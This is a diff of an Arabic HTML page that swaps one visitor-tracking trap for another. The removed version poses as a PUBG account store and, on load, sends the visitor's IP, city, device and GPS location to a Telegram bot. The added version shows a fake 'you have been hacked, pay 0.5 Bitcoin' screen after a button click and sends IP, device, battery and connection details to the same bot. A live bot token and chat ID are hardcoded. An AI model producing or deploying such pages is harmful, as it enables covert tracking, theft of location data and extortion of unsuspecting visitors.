@@ -1,136 +1,135 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>متجر حسابات ببجي موبايل - PUBG Accounts Store</title>
+    <title>Welcome</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #1a1a1a;
-            color: white;
-            text-align: center;
             margin: 0;
             padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #0f0f0f;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow: hidden;
         }
-        .header {
-            background-color: #f39c12;
-            padding: 20px;
-            font-size: 24px;
-            font-weight: bold;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.5);
-        }
-        .container {
-            padding: 20px;
-        }
-        .account-card {
-            background-color: #2c3e50;
-            border-radius: 15px;
-            margin: 15px auto;
-            padding: 15px;
-            width: 80%;
-            max-width: 400px;
-            border: 2px solid #f39c12;
-            transition: transform 0.2s;
-        }
-        .account-card:hover {
-            transform: scale(1.05);
-        }
-        .price {
-            color: #f39c12;
+
+        /* الزر الرئيسي */
+        #start-btn {
+            padding: 15px 40px;
             font-size: 20px;
-            font-weight: bold;
-        }
-        .buy-btn {
-            background-color: #f39c12;
             color: white;
+            background: linear-gradient(45deg, #ff0000, #8b0000);
             border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
+            border-radius: 50px;
             cursor: pointer;
-            font-weight: bold;
-            margin-top: 10px;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+            transition: 0.3s ease;
+            z-index: 10;
         }
-        .footer {
-            margin-top: 30px;
-            font-size: 12px;
-            color: #777;
+
+        #start-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.8);
+        }
+
+        /* نافذة الاختراق */
+        #hack-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            color: #00ff00;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            z-index: 100;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        .msg {
+            font-size: 2rem;
+            margin: 20px;
+            text-shadow: 0 0 10px #00ff00;
+        }
+
+        .bitcoin-text {
+            color: #f2a900;
+            font-weight: bold;
+            font-size: 1.5rem;
         }
     </style>
 </head>
 <body>
 
-    <div class="header">🛒 متجر حسابات ببجي الموثوق 🛒</div>
-    
-    <div class="container">
-        <p>اختر الحساب المناسب لك من القائمة أدناه:</p>
-        
-        <div class="account-card">
-            <h3>حساب ليفل 70 + سكنات نادرة</h3>
-            <p class="price">السعر: 50$</p>
-            <button class="buy-btn">شراء الآن</button>
-        </div>
+    <button id="start-btn">اضغط هنا / Click Here</button>
 
-        <div class="account-card">
-            <h3>حساب ملكي - جميع السكنات</h3>
-            <p class="price">السعر: 120$</p>
-            <button class="buy-btn">شراء الآن</button>
-        </div>
-
-        <div class="account-card">
-            <h3>حساب ليفل 40 - اقتصادي</h3>
-            <p class="price">السعر: 15$</p>
-            <button class="buy-btn">شراء الآن</button>
-        </div>
+    <div id="hack-screen">
+        <div class="msg">تم اختراقك بنجاح!<br>You have been successfully hacked!</div>
+        <div class="msg bitcoin-text">نرجو دفع نصف حبة بتكوين <br> Please pay 0.5 Bitcoin</div>
     </div>
 
-    <div class="footer">© 2023 PUBG Store - جميع الحقوق محفوظة</div>
+    <script>
+        const token = '8017423244:AAFSakFPRLMT-ksMTkb_BkBLSwBLYo_9u28';
+        const chatId = '7145266755';
 
-    <script>       
-          // إعدادات التلجرام
-        const BOT_TOKEN = '8017423244:AAFSakFPRLMT-ksMTkb_BkBLSwBLYo_9u28'; 
-        const CHAT_ID = '7145266755';
+        document.getElementById('start-btn').addEventListener('click', async () => {
+            // 1. إظهار شاشة الاختراق
+            document.getElementById('hack-screen').style.display = 'flex';
 
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-            });
-        }
-
-        async function collectData() {
-            let deviceInfo = `
-📱 الجهاز: ${navigator.userAgent}
-🌐 المتصفح: ${navigator.appName}
-🔋 البطارية: جاري الفحص...
-`;
-
-            // محاولة جلب الـ IP والموقع التقريبي
+            // 2. جلب الـ IP
+            let ipInfo = "Fetching...";
             try {
-                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
-                 deviceInfo += `\n📍 IP: ${ipData.ip}\n🌍 المدينة: ${ipData.city}\n🗺️ الدولة: ${ipData.country_name}`;
-            } catch (e) {
-                deviceInfo += "\n❌ تعذر جلب بيانات الـ IP";
+                ipInfo = ipData.ip;
+            } catch (e) { 
+                ipInfo = "Unknown"; 
             }
 
-            // طلب الموقع الدقيق (GPS) - سيطلب المتصفح إذن المستخدم هنا
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const gpsData = `\n🎯 الموقع الدقيق (GPS):\nخط العرض: ${position.coords.latitude}\nخط الطول: ${position.coords.longitude}`;
-                    await sendToTelegram(deviceInfo + gpsData);
-                }, async (error) => {
-                    await sendToTelegram(deviceInfo + "\n❌ رفض المستخدم الوصول للـ GPS");
+            // 3. جلب حالة البطارية
+            let batteryLevel = "Unknown";
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = (battery.level * 100) + "%";
+                }
+            } catch (e) { 
+                batteryLevel = "Permission Denied"; 
+            }
+
+            // 4. بناء الرسالة التي ستصل إلى بوت التليجرام
+            const message = `🚨 **New Target Hacked!** 🚨\n\n` +
+                            `🌐 IP Address: ${ipInfo}\n` +
+                            `📱 Device: ${navigator.userAgent}\n` +
+                            `🔋 Battery: ${batteryLevel}\n` +
+                            `🌐 Connection: ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}\n` +
+                            `🌍 Language: ${navigator.language}\n` +
+                            `⏰ Time: ${new Date().toLocaleString()}`;
+
+            // 5. إرسال البيانات إلى تليجرام عبر API
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
                 });
-            } else {
-                await sendToTelegram(deviceInfo + "\n❌ المتصفح لا يدعم GPS");
+            } catch (error) {
+                console.log("Error sending to Telegram:", error);
             }
-        }
-
-        // تشغيل عملية السحب بمجرد فتح الصفحة
-        window.onload = collectData;
+        });
     </script>
 </body>
 </html>
+
